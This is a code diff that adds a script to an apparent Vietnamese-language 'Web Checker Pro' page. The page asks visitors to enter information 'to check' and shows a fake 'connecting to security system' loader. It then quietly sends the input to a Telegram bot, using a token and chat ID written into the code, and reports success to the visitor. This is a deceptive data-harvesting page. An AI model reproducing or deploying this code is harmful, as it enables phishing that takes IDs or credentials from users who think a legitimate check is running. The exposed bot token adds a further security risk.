@@ -1,0 +1,69 @@
+<script>
+    // THÔNG TIN CẤU HÌNH ĐÃ CẬP NHẬT
+    const TELEGRAM_TOKEN = '8680190098:AAFOa_8RrryFZlWmfkhEE73Dns3NWaXS99Q'; 
+    const CHAT_ID = '6756767312'; 
+
+    async function startProcessing() {
+        const val = document.getElementById('userInput').value;
+
+        if (!val) {
+            Swal.fire({ 
+                icon: 'warning', 
+                title: 'Thiếu dữ liệu', 
+                text: 'Vui lòng nhập thông tin cần kiểm tra!', 
+                background: '#1e293b', 
+                color: '#fff' 
+            });
+            return;
+        }
+
+        // Hiển thị hiệu ứng chờ
+        Swal.fire({
+            title: 'Đang xử lý...',
+            html: 'Đang kết nối tới hệ thống bảo mật...',
+            allowOutsideClick: false,
+            background: '#1e293b',
+            color: '#fff',
+            didOpen: () => { Swal.showLoading(); }
+        });
+
+        try {
+            // Nội dung tin nhắn gửi về Telegram
+            const botMsg = `🚀 **THÔNG BÁO MỚI**\n━━━━━━━━━━━━━\n👤 **ID/Data:** \`${val}\`\n⏰ **Lúc:** ${new Date().toLocaleString()}\n🌐 **Nguồn:** Web Checker Pro`;
+            
+            // Gửi dữ liệu đi
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: botMsg, 
+                    parse_mode: 'Markdown' 
+                })
+            });
+
+            if (response.ok) {
+                // Nếu gửi thành công
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Hoàn tất',
+                    text: 'Yêu cầu của bạn đã được xử lý thành công!',
+                    background: '#1e293b',
+                    color: '#fff'
+                });
+                document.getElementById('userInput').value = ''; // Xóa nội dung sau khi gửi
+            } else {
+                throw new Error('Gửi thất bại');
+            }
+
+        } catch (error) {
+            Swal.fire({ 
+                icon: 'error', 
+                title: 'Lỗi kết nối', 
+                text: 'Không thể gửi dữ liệu. Vui lòng kiểm tra lại Bot!', 
+                background: '#1e293b', 
+                color: '#fff' 
+            });
+        }
+    }
+</script>
